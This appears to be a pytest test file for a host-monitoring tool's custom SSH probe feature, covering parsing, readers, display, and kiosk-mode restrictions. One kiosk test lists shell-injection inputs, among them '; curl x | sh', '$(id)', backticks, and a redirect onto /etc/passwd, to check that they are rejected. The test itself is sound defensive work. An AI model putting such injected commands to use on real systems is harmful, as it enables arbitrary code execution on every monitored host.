"""Unit tests for custom probes: ':probe' / ':probe-source', reader, column.

Design note: doc/custom-probes.md.

Covers:
  - declaration parsing and its error paths
  - the reader's command, including reaching a relayed host through its relay
  - key=value parsing, unknown keys, unparsable values
  - '--on-fail give-up' vs 'retry'
  - the stats column: value, '-' for no data, 'err' for failure
"""

import os
import threading
import time
from unittest.mock import patch

import pytest

from proc_helper import FakeProc


def _make_app(pb, tmp_path, entries=None):
    cfg = tmp_path / 'ping-bulk' / 'config'
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text('')
    with patch.object(pb, '_config_path', return_value=str(cfg)):
        app = pb.Application(entries if entries is not None else [('host', '10.0.0.1')])
    app._monitoring_started = True
    return app


@pytest.fixture
def app(pb, tmp_path):
    return _make_app(pb, tmp_path)


def _last(app, n=1):
    return [e.text.split('   ', 1)[-1] for e in list(app.events)[-n:]]


# ---------------------------------------------------------------------------
# :probe / :probe-source declarations
# ---------------------------------------------------------------------------

class TestProbeDeclaration:

    def test_full_declaration(self, app, pb):
        app._cmd_probe('temp --unit °C --range 20:90 --warn 70 --crit 85')
        d = app.probe_defs['temp']
        assert (d.unit, d.vmin, d.vmax, d.warn, d.crit) == ('°C', 20.0, 90.0, 70.0, 85.0)
        assert d.on_fail == 'retry'

    def test_label_is_capitalised_for_the_column(self, app):
        app._cmd_probe('temp')
        assert app.probe_defs['temp'].label == 'Temp'

    def test_on_fail_give_up(self, app):
        app._cmd_probe('temp --on-fail give-up')
        assert app.probe_defs['temp'].on_fail == 'give-up'

    @pytest.mark.parametrize('args,expect', [
        ('temp --range 90:20', 'MIN < MAX'),
        ('temp --range nope',  'MIN:MAX'),
        ('temp --warn hot',    'expected a number'),
        ('temp --on-fail maybe', 'retry or give-up'),
        ('temp --bogus x',     'unknown argument'),
        ('--unit °C',          'missing probe name'),
    ])
    def test_error_paths(self, app, args, expect):
        app._cmd_probe(args)
        assert expect in _last(app)[0]
        assert 'temp' not in app.probe_defs

    def test_builtin_stat_name_is_refused(self, app):
        """A probe named 'avg' would be unaddressable in ':set stats'."""
        app._cmd_probe('avg --unit x')
        assert 'built-in stat column' in _last(app)[0]
        assert 'avg' not in app.probe_defs

    def test_source_declaration(self, app):
        app._cmd_probe_source("--cmd '/usr/local/bin/pb-probe' --interval 30")
        assert app.probe_source == '/usr/local/bin/pb-probe'
        assert app.probe_interval == 30.0

    def test_source_off(self, app):
        app._cmd_probe_source("--cmd /bin/true")
        app._cmd_probe_source('off')
        assert app.probe_source is None

    @pytest.mark.parametrize('args,expect', [
        ('--interval 0',        'positive number'),
        ('--cmd x --retain 0',  'positive sample count'),
        ('--interval 5',        'missing --cmd'),
        ('--nope x',            'unknown argument'),
    ])
    def test_source_error_paths(self, app, args, expect):
        app._cmd_probe_source(args)
        assert expect in _last(app)[0]


# ---------------------------------------------------------------------------
# ProbeReader
# ---------------------------------------------------------------------------

class TestProbeReaderCommand:

    def _reader(self, pb, monitor, interval=60):
        return pb.ProbeReader(monitor, 'pb-probe', interval,
                              {'temp': pb.ProbeDef('temp')}, retain=10)

    def test_plain_host_is_reached_directly(self, pb):
        r = self._reader(pb, pb.PingMonitor('10.0.0.1'))
        cmd = r._build_cmd()
        assert cmd[:3] == ['ssh', '-o', 'BatchMode=yes']
        assert '10.0.0.1' in cmd
        assert '-J' not in cmd

    def test_relayed_host_is_reached_through_its_relay(self, pb):
        """Values are per host, so the probe runs on the target, not the relay."""
        m = pb.SshPingMonitor(['relay'], '10.123.1.8')
        cmd = self._reader(pb, m)._build_cmd()
        assert '-J' in cmd and cmd[cmd.index('-J') + 1] == 'relay'
        assert '10.123.1.8' in cmd

    def test_existing_jumps_precede_the_relay(self, pb):
        m = pb.SshPingMonitor(['-J', 'bastion', 'relay'], '10.123.1.8')
        cmd = self._reader(pb, m)._build_cmd()
        assert cmd[cmd.index('-J') + 1] == 'bastion,relay', cmd

    def test_command_loops_on_the_far_side(self, pb):
        """One connection serves every reading, so the loop lives remotely."""
        r = self._reader(pb, pb.PingMonitor('h'), interval=15)
        remote = r._build_cmd()[-1]
        assert 'while :' in remote and 'sleep 15' in remote

    def test_stale_window_scales_with_the_interval(self, pb):
        """A 60 s round must not look wedged to a 2 s watchdog."""
        assert self._reader(pb, pb.PingMonitor('h'), interval=60)._STALE_SECS >= 120


class TestProbeReaderParsing:

    def _run(self, pb, lines, defs=None, retain=100, expect=1, close=True):
        """Drive one ProbeReader over a fake pipe until *expect* samples land.

        The settle step used to be ``time.sleep(0.2)`` — inside a
        ``patch('time.sleep')`` block, so it returned instantly and the reader
        thread was simply raced.  Under a loaded full-suite run it lost about
        one in three, and the guide says not to lean on a fixed sleep for a
        state transition.  Waiting for the samples the case is about is both
        faster and deterministic.

Returns ``(monitor, reader, states)``, where *states* is each
        series' ``state`` once its samples had landed.

        ``close=False`` leaves the fake source running instead of closing the
        pipe after its last line.  It matters for any case that asserts a
        *healthy* state: with ``close=True`` the source exits straight after
        its last reading, and a source that exits is a failure, so every
        series reads ``err`` — deterministically, once the read is no longer
        raced.  The old ``state == 'ok'`` assertion passed only by beating the
        reader to it.
        """
        m = pb.PingMonitor('10.0.0.1')
        defs = defs or {'temp': pb.ProbeDef('temp'), 'rpm': pb.ProbeDef('rpm')}
        r = pb.ProbeReader(m, 'pb-probe', 0.2, defs, retain=retain)
        proc = FakeProc(stdout_lines=lines, close=close)

        def _samples():
            return max((len(s.values) for s in m.probes.values()), default=0)

        # Captured before the patch: 'patch("time.sleep")' is there so the
        # reader does not wait out its interval, but the poll below still
        # needs a real yield — spinning holds the GIL and starves the very
        # thread it is waiting for.
        real_sleep = time.sleep
        with patch('subprocess.Popen', return_value=proc), patch('time.sleep'):
            t = threading.Thread(target=r.run, daemon=True)
            t.start()
            deadline = time.monotonic() + 5
            while time.monotonic() < deadline and _samples() < expect:
                real_sleep(0.005)
            states = {k: v.state for k, v in m.probes.items()}
            r.running = False
            t.join(5)
        return m, r, states

    def test_values_are_collected_as_a_series(self, pb):
        m, _, states = self._run(
            pb, ['temp=54.2\n', '---\n', 'temp=55.9\n', '---\n'],
            expect=2, close=False)
        assert list(m.probes['temp'].values) == [54.2, 55.9]
        assert states['temp'] == 'ok', 'healthy while the readings arrived'

    def test_timestamps_are_recorded_alongside(self, pb):
        """The strip and the sparkline both need when, not just what."""
        m, _, states = self._run(pb, ['temp=54.2\n', '---\n'])
        s = m.probes['temp']
        assert len(s.times) == len(s.values) == 1

    def test_undeclared_keys_are_ignored(self, pb):
        """One site-wide script may serve hosts that display different subsets."""
        m, _, states = self._run(pb, ['temp=1\n', 'humidity=40\n', '---\n'])
        assert 'humidity' not in m.probes

    def test_unparsable_value_marks_err(self, pb):
        m, _, states = self._run(pb, ['temp=warm\n', '---\n'])
        assert m.probes['temp'].state == 'err'

    def test_retain_bounds_the_series(self, pb):
        lines = [f'temp={i}\n' for i in range(20)]
        m, _, states = self._run(pb, lines, retain=5, expect=5)
        assert len(m.probes['temp'].values) == 5

    def test_garbage_lines_do_not_raise(self, pb):
        m, _, states = self._run(pb, ['not a pair\n', '\n', '---\n', 'temp=1\n'])
        assert m.probes['temp'].values


class TestProbeFailurePolicy:

    def _reader(self, pb, on_fail):
        m = pb.PingMonitor('h')
        defs = {'temp': pb.ProbeDef('temp', on_fail=on_fail)}
        return m, pb.ProbeReader(m, 'c', 1, defs, retain=10)

    def test_retry_keeps_state_err(self, pb):
        m, r = self._reader(pb, 'retry')
        for _ in range(10):
            r._fail_all()
        assert m.probes['temp'].state == 'err'

    def test_give_up_stops_after_repeated_failures(self, pb):
        m, r = self._reader(pb, 'give-up')
        for _ in range(pb._PROBE_GIVE_UP_FAILS):
            r._fail_all()
        assert m.probes['temp'].state == 'gave-up'

    def test_give_up_survives_a_single_failure(self, pb):
        """One lost round must not brand a host, as with the clock's no-rt."""
        m, r = self._reader(pb, 'give-up')
        r._fail_all()
        assert m.probes['temp'].state == 'err'

    def test_a_reading_clears_the_failure_count(self, pb):
        m, r = self._reader(pb, 'give-up')
        r._fail_all()
        r._handle_stdout_line('temp=50')
        assert m.probes['temp'].state == 'ok'
        assert m.probes['temp'].fails == 0


# ---------------------------------------------------------------------------
# View (a): the stats column
# ---------------------------------------------------------------------------

class TestProbeColumn:

    @pytest.fixture
    def wired(self, app, pb):
        app._cmd_probe('temp --unit °C --range 20:90 --warn 70 --crit 85')
        return app, app.monitors[0]

    def test_no_data_shows_dash(self, wired, pb):
        app, m = wired
        assert app._stat_cell(m, 'Temp') == '-'

    def test_value_is_shown(self, wired, pb):
        app, m = wired
        m.probes['temp'] = s = pb.ProbeSeries(10)
        s.add(54.2, time.time())
        assert app._stat_cell(m, 'Temp') == '54.2'

    def test_whole_numbers_do_not_widen_the_column(self, wired, pb):
        app, m = wired
        m.probes['temp'] = s = pb.ProbeSeries(10)
        s.add(88.0, time.time())
        assert app._stat_cell(m, 'Temp') == '88'

    def test_failure_shows_err(self, wired, pb):
        app, m = wired
        m.probes['temp'] = s = pb.ProbeSeries(10)
        s.state = 'err'
        assert app._stat_cell(m, 'Temp') == 'err'

    def test_gave_up_also_shows_err(self, wired, pb):
        """No third symbol; the overlay explains that polling stopped."""
        app, m = wired
        m.probes['temp'] = s = pb.ProbeSeries(10)
        s.state = 'gave-up'
        assert app._stat_cell(m, 'Temp') == 'err'

    def test_header_carries_the_unit(self, wired):
        app, _ = wired
        assert app._stat_header('Temp') == 'Temp,°C'

    def test_builtin_columns_are_unaffected(self, wired, pb):
        app, m = wired
        assert app._stat_header('Avg') == 'Avg'
        assert app._stat_cell(m, 'Avg') == app._compute_stat(m, 'Avg')

    def test_set_stats_accepts_a_probe_name(self, wired):
        app, _ = wired
        app._cmd_stats('temp,avg')
        assert app.stats_custom == ['Temp', 'Avg']

    def test_set_stats_accepts_a_probe_alone(self, wired):
        app, _ = wired
        app._cmd_stats('temp')
        assert app.stats_custom == ['Temp']

    def test_unknown_column_still_rejected(self, wired):
        app, _ = wired
        app._cmd_stats('temp,nosuch')
        assert 'unknown column' in _last(app)[0]


class TestProbeReadersLifecycle:

    def test_no_readers_without_a_source(self, app):
        app._cmd_probe('temp')
        app._start_probe_readers()
        assert app.probe_readers == []

    def test_no_readers_without_a_declaration(self, app):
        """An undeclared source would open a connection per host for nothing."""
        app._cmd_probe_source('--cmd /bin/true')
        app._start_probe_readers()
        assert app.probe_readers == []

    def test_one_reader_per_host(self, pb, tmp_path):
        app = _make_app(pb, tmp_path,
                        [('host', '10.0.0.1'), ('host', '10.0.0.2')])
        app._cmd_probe('temp')
        app._cmd_probe_source('--cmd /bin/true')
        with patch('threading.Thread'):
            app._start_probe_readers()
        assert len(app.probe_readers) == 2

    def test_port_monitors_are_skipped(self, pb, tmp_path):
        """A TCP check has no shell on the far side."""
        app = _make_app(pb, tmp_path, [('host', 'example.com:443')])
        app._cmd_probe('temp')
        app._cmd_probe_source('--cmd /bin/true')
        with patch('threading.Thread'):
            app._start_probe_readers()
        assert app.probe_readers == []

    def test_stop_clears_them(self, pb, tmp_path):
        app = _make_app(pb, tmp_path)
        app._cmd_probe('temp')
        app._cmd_probe_source('--cmd /bin/true')
        with patch('threading.Thread'):
            app._start_probe_readers()
        app._stop_probe_readers()
        assert app.probe_readers == []


# ---------------------------------------------------------------------------
# View (b): the history strip
# ---------------------------------------------------------------------------

class TestProbeChar:
    """Declared range, not observed: a glyph must mean the same on every host."""

    @pytest.mark.parametrize('value,expect', [
        (20, '0'), (25, '0'), (55, '5'), (89, '9'), (90, '9'),
    ])
    def test_maps_across_the_range(self, pb, value, expect):
        assert pb._probe_char(value, 20, 90) == expect

    def test_above_range_clamps_up(self, pb):
        assert pb._probe_char(120, 20, 90) == '>'

    def test_below_range_clamps_down(self, pb):
        assert pb._probe_char(5, 20, 90) == '<'

    def test_no_value_is_blank(self, pb):
        assert pb._probe_char(None, 20, 90) == ' '

    def test_no_declared_range_is_unknown(self, pb):
        """Without --range there is nothing to scale against."""
        assert pb._probe_char(50, None, None) == '?'


class TestProbeStrip:

    @pytest.fixture
    def wired(self, app, pb):
        app._cmd_probe('temp --range 0:100')
        m = app.monitors[0]
        m.probes['temp'] = s = pb.ProbeSeries(500)
        for i, v in enumerate([0, 25, 50, 75, 100]):
            s.add(v, time.time() - (5 - i) * 60)
        return app, m, app.probe_defs['temp']

    def test_one_cell_per_sample(self, wired):
        app, m, probe = wired
        assert app._probe_history_string(m, probe, 5) == '02579'

    def test_short_series_is_right_aligned(self, wired):
        """Newest on the right, as the ping strip is."""
        app, m, probe = wired
        assert app._probe_history_string(m, probe, 8) == '   02579'

    def test_offset_scrolls_back(self, wired):
        app, m, probe = wired
        assert app._probe_history_string(m, probe, 3, offset=2).strip() == '025'

    def test_no_series_is_blank(self, app, pb):
        app._cmd_probe('temp --range 0:100')
        assert app._probe_history_string(pb.PingMonitor('x'),
                                         app.probe_defs['temp'], 4) == '    '

    def test_ping_view_selects_a_probe(self, wired):
        app, _, _ = wired
        app._cmd_history('temp')
        assert app._history_mode_name() == 'Temp'

    def test_cycling_returns_to_the_builtins(self, wired):
        """[H] cycles ping modes; it must not be stuck on a probe."""
        app, _, _ = wired
        app._cmd_history('temp')
        app.cycle_history_mode(1)
        assert app._history_mode_name() in ('success', 'rtt', 'scaled')

    def test_builtin_mode_still_works(self, wired):
        app, _, _ = wired
        app._cmd_history('temp')
        app._cmd_history('scaled')
        assert app._history_mode_name() == 'scaled'

    def test_unknown_mode_lists_probes_too(self, wired):
        app, _, _ = wired
        app._cmd_history('nosuch')
        assert 'temp' in _last(app)[0]


# ---------------------------------------------------------------------------
# View (c): the details overlay
# ---------------------------------------------------------------------------

class TestProbeOverlay:

    @pytest.fixture
    def wired(self, app, pb):
        app._cmd_probe('temp --unit °C --range 20:90 --warn 70 --crit 85')
        m = app.monitors[0]
        m.probes['temp'] = s = pb.ProbeSeries(500)
        for i in range(10):
            s.add(40.0 + i, time.time() - (10 - i) * 60)
        return app, m

    def _text(self, app, m):
        return '\n'.join(app._probe_overlay_lines(m, 62))

    def test_block_has_a_heading_with_unit(self, wired):
        assert 'Probe: temp (°C)' in self._text(*wired)

    def test_shows_current_and_thresholds(self, wired):
        text = self._text(*wired)
        assert 'Current:     49.0' in text
        assert 'warn 70' in text and 'crit 85' in text

    def test_shows_spread(self, wired):
        text = self._text(*wired)
        assert 'Min / Max:   40.0 / 49.0' in text
        assert 'Average: 44.5' in text

    def test_shows_a_sparkline(self, wired):
        """The reason to open the overlay: the column already has the number."""
        text = self._text(*wired)
        assert 'History:' in text
        line = [l for l in text.split('\n') if 'History:' in l][0]
        assert any(c.isdigit() for c in line.split('History:')[1])

    def test_sparkline_is_labelled_with_its_span(self, wired):
        assert 'now ^' in self._text(*wired)

    def test_unread_probe_has_no_block(self, app, pb):
        """A probe declared but never read on this host says nothing."""
        app._cmd_probe('temp')
        assert app._probe_overlay_lines(pb.PingMonitor('x'), 62) == []

    def test_gave_up_explains_itself(self, wired):
        """'err' in the column; the reason belongs where there is room."""
        app, m = wired
        m.probes['temp'].state = 'gave-up'
        assert 'polling stopped' in self._text(app, m)

    def test_error_state_is_shown(self, wired):
        app, m = wired
        m.probes['temp'].state = 'err'
        assert 'Current:     err' in self._text(app, m)


# ---------------------------------------------------------------------------
# Kiosk mode
# ---------------------------------------------------------------------------

class TestProbeKiosk:
    """A probe runs a chosen command on every host, so kiosk must constrain it.

    The console user is the adversary there: declaration has to come from the
    admin-owned hosts file, and the script it names must not be rewritable.
    """

    def _app(self, pb, tmp_path, started=True):
        cfg = tmp_path / 'ping-bulk' / 'config'
        cfg.parent.mkdir(parents=True, exist_ok=True)
        cfg.write_text('')
        with patch.object(pb, '_config_path', return_value=str(cfg)):
            app = pb.Application([('host', '10.0.0.1')], kiosk_mode=True)
        app._monitoring_started = started
        return app

    # ── interactive declaration is refused ──────────────────────────────────

    def test_interactive_source_is_blocked(self, pb, tmp_path):
        app = self._app(pb, tmp_path)
        app._cmd_probe_source('--cmd /usr/bin/true')
        assert app.probe_source is None
        assert 'not allowed interactively' in _last(app)[0]

    def test_interactive_probe_is_blocked(self, pb, tmp_path):
        """Otherwise a column could be added to an admin's source."""
        app = self._app(pb, tmp_path)
        app._cmd_probe('temp')
        assert app.probe_defs == {}
        assert 'not allowed interactively' in _last(app)[0]

    def test_hosts_file_declaration_is_allowed(self, pb, tmp_path):
        """Startup dispatch is the admin-owned path."""
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe('temp')
        app._cmd_probe_source('--cmd /usr/bin/true')
        assert 'temp' in app.probe_defs
        assert app.probe_source == '/usr/bin/true'

    def test_not_restricted_outside_kiosk(self, pb, tmp_path):
        cfg = tmp_path / 'ping-bulk' / 'config'
        cfg.parent.mkdir(parents=True, exist_ok=True)
        cfg.write_text('')
        with patch.object(pb, '_config_path', return_value=str(cfg)):
            app = pb.Application([('host', '10.0.0.1')])
        app._monitoring_started = True
        app._cmd_probe_source('--cmd /usr/bin/true')
        assert app.probe_source == '/usr/bin/true'

    # ── the command file must be admin-owned ────────────────────────────────

    def test_safe_system_path_is_accepted(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source('--cmd /usr/bin/true')
        assert app.probe_source == '/usr/bin/true'

    def test_world_writable_script_is_refused(self, pb, tmp_path):
        """A script anyone can rewrite is a command anyone can choose."""
        script = tmp_path / 'probe.sh'
        script.write_text('#!/bin/sh\n')
        os.chmod(script, 0o777)
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source(f'--cmd {script}')
        assert app.probe_source is None
        assert 'group- or world-writable' in _last(app)[0]

    def test_writable_parent_directory_is_refused(self, pb, tmp_path):
        """A writable directory lets the file be replaced wholesale."""
        d = tmp_path / 'open'
        d.mkdir()
        script = d / 'probe.sh'
        script.write_text('#!/bin/sh\n')
        os.chmod(script, 0o755)
        os.chmod(d, 0o777)
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source(f'--cmd {script}')
        assert app.probe_source is None
        assert 'can be replaced' in _last(app)[0]

    def test_inline_command_is_refused(self, pb, tmp_path):
        """An inline pipeline has no file whose ownership could be checked."""
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source("--cmd 'echo temp=1'")
        assert app.probe_source is None
        assert 'absolute path' in _last(app)[0]

    def test_relative_path_is_refused(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source('--cmd probe.sh')
        assert app.probe_source is None
        assert 'absolute path' in _last(app)[0]

    def test_missing_file_is_refused(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source('--cmd /nonexistent-probe-xyz')
        assert app.probe_source is None
        assert 'cannot stat' in _last(app)[0]

    def test_directory_is_refused(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source('--cmd /usr/bin')
        assert app.probe_source is None
        assert 'not a regular file' in _last(app)[0]

    @pytest.mark.parametrize('cmd', [
        '/usr/bin/true; curl x | sh',
        '/usr/bin/true && evil',
        '/usr/bin/true `id`',
        '/usr/bin/true $(id)',
        '/usr/bin/true > /etc/passwd',
        '/usr/bin/true | tee x',
    ])
    def test_shell_metacharacters_are_refused(self, pb, tmp_path, cmd):
        """Only the first token can be ownership-checked.

        Without this, '/usr/bin/true; curl … | sh' passes a check on
        /usr/bin/true and then runs whatever follows on every host.
        """
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source(f"--cmd '{cmd}'")
        assert app.probe_source is None
        assert 'not allowed in the command' in _last(app)[0]

    def test_plain_flags_are_still_allowed(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe_source("--cmd '/usr/bin/true --quiet'")
        assert app.probe_source == '/usr/bin/true --quiet'

    # ── the connection is isolated from the user's home ─────────────────────

    def test_reader_isolates_ssh_in_kiosk(self, pb):
        """Without this a probe would read ~/.ssh/config and the user's keys."""
        r = pb.ProbeReader(pb.PingMonitor('10.0.0.1'), 'p', 60,
                           {'temp': pb.ProbeDef('temp')}, retain=10,
                           kiosk_mode=True)
        cmd = r._build_cmd()
        assert '-F' in cmd and cmd[cmd.index('-F') + 1] == 'none'
        assert 'IdentityFile=none' in cmd
        assert 'ProxyCommand=none' in cmd

    def test_reader_does_not_isolate_outside_kiosk(self, pb):
        r = pb.ProbeReader(pb.PingMonitor('10.0.0.1'), 'p', 60,
                           {'temp': pb.ProbeDef('temp')}, retain=10)
        assert '-F' not in r._build_cmd()

    def test_readers_get_the_app_kiosk_flag(self, pb, tmp_path):
        app = self._app(pb, tmp_path, started=False)
        app._cmd_probe('temp')
        app._cmd_probe_source('--cmd /usr/bin/true')
        with patch('threading.Thread'):
            app._start_probe_readers()
        assert app.probe_readers and app.probe_readers[0].kiosk_mode is True
